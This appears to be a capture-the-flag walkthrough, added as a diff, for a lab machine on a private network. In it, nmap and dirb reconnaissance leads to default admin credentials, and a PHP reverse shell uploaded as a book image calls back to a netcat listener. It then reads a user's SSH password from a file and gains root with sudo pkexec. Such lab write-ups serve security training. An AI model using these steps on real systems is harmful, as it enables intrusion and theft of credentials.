@@ -1,0 +1,40 @@
+1. -> nmap -sn 192.168.56.0/24
+
+2. -> nmap -sV -A -sC -p- 192.168.56.113
+
+3. -> dirb http://192.168.56.113 
+
+4. By visiting "/store/database" we will get username and password for "/store/admin.php" , which is "admin", "admin"
+
+5. log in to "/store/admin.php" using creds we found above
+   we can add or delete books..soo lets add one book,
+   Add new book
+   upload shell.php ( instead of image )
+
+6. locate php-reverse
+   copy the content of php-reverse-shell into new file "shell.php in your current dir (say downloads)
+   -> cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php 
+   make sure you edit ip in "shell.php" and put your attack vms ip and port no of your choice
+   -> vi shell.php
+
+7. -> nc -nvlp 4545 
+   Now from your current dir and start netcat for reverse shell before accessing your newly added ebook
+   Access ebook in browser and you will get reverse shell connection.
+
+8. -> cd /home 
+   -> ls -la
+   -> ls tony
+   -> cat /tony/password.txt
+   copy the ssh password, given for user tony 
+
+9. -> ssh tony@192.168.56.113
+   -> sudo -l 
+   -> sudo pkexec /bin/sh
+   -> ls  
+   -> cat root.flag
+
+
+
+
+
+
